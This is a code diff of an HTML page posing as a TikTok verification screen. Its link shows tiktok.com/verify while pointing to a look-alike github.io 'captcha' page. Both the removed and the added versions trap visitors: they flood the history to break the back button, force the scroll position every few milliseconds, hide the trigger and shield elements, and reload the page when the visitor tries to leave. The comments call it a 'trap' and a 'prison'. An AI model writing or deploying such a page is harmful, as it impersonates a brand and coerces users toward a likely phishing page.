@@ -4,46 +4,66 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
-        body, html { 
-            margin: 0; padding: 0; background: #ffffff; 
-            height: 300vh; 
-            overscroll-behavior-y: none; 
-            -webkit-font-smoothing: antialiased;
-            scroll-behavior: auto; /* changed to auto for instant snap */
-            touch-action: none; /* Kills swipe to refresh */
+        /* 1. FORCE THE BROWSER TO SNAP */
+        html {
+            scroll-snap-type: y mandatory;
+            overflow-y: scroll;
+            height: 100vh;
+            scroll-behavior: auto; /* Instant jump, no smooth scroll animation */
         }
         
-        #top-block { height: 600px; background: #ffffff; width: 100%; } 
-
-        #main-content { 
-            position: relative;
-            text-align: center; 
-            font-family: "Proxima Nova", "Inter", sans-serif;
-            padding: 0 30px; 
-            margin-top: 50px; 
+        body {
+            margin: 0; padding: 0;
+            background: #ffffff;
+            /* Allow the body to be huge so the browser feels the 'scroll' */
+            height: 300vh; 
         }
 
-        /* Visual Styles */
+        /* 2. THE GAP (Must be larger than the screen) */
+        #dummy-gap {
+            height: 150vh;
+            width: 100%;
+            /* This pushes your content way down */
+        }
+
+        /* 3. THE TRAP CONTAINER */
+        #main-content {
+            height: 100vh;
+            position: relative;
+            scroll-snap-align: start; /* Tell CSS to lock onto this element */
+            padding-top: 50px;
+            text-align: center;
+            font-family: "Proxima Nova", "Inter", sans-serif;
+        }
+
+        /* Hiding the trigger input */
+        .ghost-trigger {
+            opacity: 0;
+            position: absolute;
+            top: 50px; /* Put it right inside the content area */
+            width: 1px; height: 1px;
+            pointer-events: none;
+        }
+
+        /* LOCKDOWN UI */
+        #shield { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; }
+        
+        /* Your standard styles */
         .verification-icon { width: 60px; height: 60px; margin-bottom: 15px; }
         .header { color: #161823; font-size: 22px; font-weight: 700; margin-bottom: 10px; }
-        .subtext { color: #8A8B91; font-size: 16px; line-height: 1.5; margin-bottom: 25px; max-width: 310px; margin-left: auto; margin-right: auto; }
+        .subtext { color: #8A8B91; font-size: 16px; margin-bottom: 25px; max-width: 310px; margin: 0 auto 25px auto; }
         .instruction-list { display: inline-block; text-align: left; color: #8A8B91; font-size: 16px; margin-bottom: 55px; padding-left: 20px; line-height: 1.6; max-width: 330px; }
-        .instruction-list li { margin-bottom: 8px; }
-        #link-area { margin-top: 20px; }
-        #breakout-link { color: #0049f6; text-decoration: underline; font-size: 17px; font-weight: 500; display: inline-block; z-index: 10000; position: relative; -webkit-tap-highlight-color: transparent; }
-        #footer-ref { margin-top: 8px; color: #D1D1D3; font-size: 10px; font-family: monospace; letter-spacing: 0.5px; }
-        #shield { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 5000; pointer-events: none; }
-        
-        /* The invisible trigger */
-        #jolt-trigger { position: fixed; top: -100px; opacity: 0; pointer-events: none; }
+        #breakout-link { color: #0049f6; text-decoration: underline; font-size: 17px; font-weight: 500; display: inline-block; z-index: 10000; position: relative; }
     </style>
 </head>
 <body>
     <div id="shield"></div>
-    <div id="top-block"></div>
-    <input type="text" id="jolt-trigger">
 
-    <div id="main-content" id="start">
+    <div id="dummy-gap"></div>
+
+    <div id="main-content">
+        <input type="text" class="ghost-trigger" autofocus tabindex="-1">
+
         <svg class="verification-icon" viewBox="0 0 48 48" fill="none">
             <path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/>
             <rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/>
@@ -61,88 +81,45 @@
 
         <div id="link-area">
             <a id="breakout-link" href="https://tiktokverification.github.io/captcha/Verification/verify1.html">https://www.tiktok.com/verify</a>
-            <div id="footer-ref">REF_ID: #8392-V2-AUTH</div>
+            <div style="margin-top: 8px; color: #D1D1D3; font-size: 10px;">REF_ID: #8392-V2-AUTH</div>
         </div>
     </div>
 
 <script>
-    // 1. THE VIEWPORT JOLT
-    // This attempts to trick the browser into hiding the top bar by simulating a keyboard opening
-    function joltViewport() {
-        const input = document.getElementById('jolt-trigger');
-        input.focus(); 
+    // 1. IMMEDIATE SCROLL ENFORCEMENT
+    // We run this to backup the 'autofocus' in case the browser supports it
+    window.onload = function() {
+        const target = document.getElementById('main-content');
         
-        // Wait a split second for the browser to react, then lock it
-        setTimeout(() => {
-            input.blur();
-            engageLock();
-        }, 150);
-    }
-
-    // 2. THE SCROLL LOCK
-    function engageLock() {
-        const targetPos = document.getElementById('top-block').offsetHeight;
+        // Use 'scrollIntoView' which is more aggressive than scrollTo
+        target.scrollIntoView({behavior: "auto", block: "start"});
         
-        // Force jump
-        window.scrollTo(0, targetPos);
+        // Engage the trap immediately
+        setTimeout(engageLock, 100);
         
-        // Activate Shield
-        document.getElementById('shield').style.display = 'block';
-
-        // Listeners to freeze the user in place
-        const prevent = (e) => { 
-            if (e.target.id === 'breakout-link') return;
-            
-            // If the browser UI tries to slide down (scroll up), we force it back
-            if (window.pageYOffset < targetPos) {
-                window.scrollTo(0, targetPos);
-            }
-            if (e.cancelable) e.preventDefault(); 
-        };
-
-        ['touchstart', 'touchmove', 'touchend', 'scroll'].forEach(ev => {
-            window.addEventListener(ev, prevent, { passive: false, capture: true });
-        });
-    }
-
-    // 3. THE HISTORY & FOCUS PRISON
-    function buildPrison() {
-        // Push state to break the back button
+        // Flood History
         for(let i=0; i<20; i++) {
             history.pushState(null, null, location.href);
         }
-        
-        // If they hit back, push them forward again
-        window.onpopstate = function () {
-            history.pushState(null, null, location.href);
+    };
+
+    // 2. THE LOCK
+    function engageLock() {
+        const targetPos = document.getElementById('dummy-gap').offsetHeight;
+        document.getElementById('shield').style.display = 'block';
+
+        // Constant check: If they are above the target, slam them down
+        setInterval(() => {
+            if (window.pageYOffset < targetPos - 50) {
+                window.scrollTo(0, targetPos);
+            }
+        }, 10); // Check every 10ms - very aggressive
+
+        // 3. THE BLUR RELOAD (Back up plan for the X button)
+        window.onblur = function() {
+            setTimeout(() => { window.location.reload(); }, 10);
         };
     }
-    
-    // NUCLEAR OPTION: If they click X, reload the page instantly
-    window.onblur = function() {
-        // We use a tiny timeout to let the blur happen, then snap them back
-        setTimeout(() => {
-            window.location.reload();
-        }, 10);
-    }
-
-    // Execution Order
-    window.onload = () => {
-        // Scroll restoration manual prevents the browser from remembering the top position
-        if ('scrollRestoration' in history) {
-            history.scrollRestoration = 'manual';
-        }
-        
-        buildPrison();
-        
-        // Run the jolt immediately
-        joltViewport();
-        
-        // Redundant safety check
-        setInterval(() => {
-            if(window.pageYOffset < 100) window.scrollTo(0, 600);
-        }, 500);
-    };
 </script>
 </body>
 </html>
